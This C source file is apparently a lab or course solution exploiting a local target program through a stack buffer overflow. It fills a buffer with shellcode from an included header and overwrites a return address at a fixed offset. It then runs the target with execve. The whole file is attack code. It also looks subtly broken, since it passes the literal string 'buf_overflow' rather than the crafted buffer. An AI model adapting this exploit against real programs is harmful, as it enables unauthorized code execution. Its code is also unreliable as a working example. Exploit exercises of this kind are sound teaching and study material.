#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target1"
#define BUFSIZE 141
#define TARGET_ADDR 0x40a4fe00
#define SHELLCODE_LENGTH 45
#define NOP 0x90
int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

	char buf_overflow[BUFSIZE];
	int i;

	for(i=0; i < BUFSIZE; i++)
		buf_overflow[i] = NOP;
	
	for(i=0; i < SHELLCODE_LENGTH; i++)
		buf_overflow[i] = shellcode[i];

	int *a = (int*)&buf_overflow[136];
	*a = TARGET_ADDR;

	
	args[0] = TARGET;
	args[1] = "buf_overflow";
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
